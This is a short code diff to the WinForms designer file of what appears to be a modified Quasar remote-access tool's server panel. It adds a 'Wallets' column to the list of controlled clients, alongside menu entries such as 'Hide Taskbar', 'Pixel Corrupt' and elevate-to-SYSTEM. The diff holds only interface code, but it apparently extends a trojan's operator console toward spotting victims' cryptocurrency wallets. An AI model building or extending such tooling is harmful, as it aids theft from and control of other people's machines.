@@ -198,6 +198,7 @@ namespace Quasar.Server.Forms
             this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.hWallets = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.contextMenuStrip.SuspendLayout();
             this.tableLayoutPanel.SuspendLayout();
             this.MainTabControl.SuspendLayout();
@@ -560,7 +561,6 @@ namespace Quasar.Server.Forms
             this.hideTaskBarToolStripMenuItem.Text = "Hide Taskbar";
             this.hideTaskBarToolStripMenuItem.Click += new System.EventHandler(this.hideTaskBarToolStripMenuItem_Click);
             // 
-            // 
             // gdiToolStripMenuItem
             // 
             this.gdiToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
@@ -570,12 +570,11 @@ namespace Quasar.Server.Forms
             this.gdiToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
             this.gdiToolStripMenuItem.Text = "GDI";
             // 
-            // 
             // pixelCorruptToolStripMenuItem
             // 
             this.pixelCorruptToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.pencil;
             this.pixelCorruptToolStripMenuItem.Name = "pixelCorruptToolStripMenuItem";
-            this.pixelCorruptToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
+            this.pixelCorruptToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
             this.pixelCorruptToolStripMenuItem.Text = "Pixel Corrupt";
             this.pixelCorruptToolStripMenuItem.Click += new System.EventHandler(this.pixelCorruptToolStripMenuItem_Click);
             // 
@@ -1020,7 +1019,8 @@ namespace Quasar.Server.Forms
             this.hUserStatus,
             this.hCountry,
             this.hOS,
-            this.hAccountType});
+            this.hAccountType,
+            this.hWallets});
             this.lstClients.ContextMenuStrip = this.contextMenuStrip;
             this.lstClients.Dock = System.Windows.Forms.DockStyle.Fill;
             this.lstClients.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
@@ -1859,6 +1859,10 @@ namespace Quasar.Server.Forms
             this.builderToolStripMenuItem.Text = "Builder";
             this.builderToolStripMenuItem.Click += new System.EventHandler(this.builderToolStripMenuItem_Click);
             // 
+            // hWallets
+            // 
+            this.hWallets.Text = "Wallets";
+            // 
             // FrmMain
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
@@ -2051,5 +2055,6 @@ namespace Quasar.Server.Forms
         private ToolStripMenuItem elevateClientPermissionsToolStripMenuItem;
         private ToolStripMenuItem elevateToSystemToolStripMenuItem;
         private ToolStripMenuItem deElevateFromSystemToolStripMenuItem;
+        private ColumnHeader hWallets;
     }
 }
